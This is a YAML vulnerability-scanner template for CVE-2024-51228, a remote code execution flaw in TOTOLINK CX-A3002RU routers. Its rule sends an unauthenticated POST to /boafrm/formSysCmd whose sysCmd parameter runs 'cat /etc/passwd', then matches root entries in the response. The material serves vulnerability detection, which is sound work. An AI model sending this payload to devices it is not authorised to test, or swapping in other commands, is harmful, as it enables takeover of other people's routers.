id: CVE-2024-51228
info:
  name: TOTOLINK CX-A3002RU RCE
  author: ZacharyZcR
  severity: critical
  verified: true
  description: |
    A remote code execution vulnerability exists in TOTOLINK CX-A3002RU devices via formSysCmd.
    The vulnerability allows an unauthenticated attacker to execute arbitrary system commands through URL-encoded sysCmd parameter.
    fofa: TOTOLINK
  reference:
    - https://xz.aliyun.com/t/16707
  tags: cve,cve2024,iot,rce,totolink
  created: 2024/12/31

rules:
  r0:
    request:
      method: POST
      path: /boafrm/formSysCmd
      body: sysCmd=cat+/etc/passwd&apply=Apply&submit-url=/syscmd.htm&msg=
    expression: |
      "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
expression: r0()
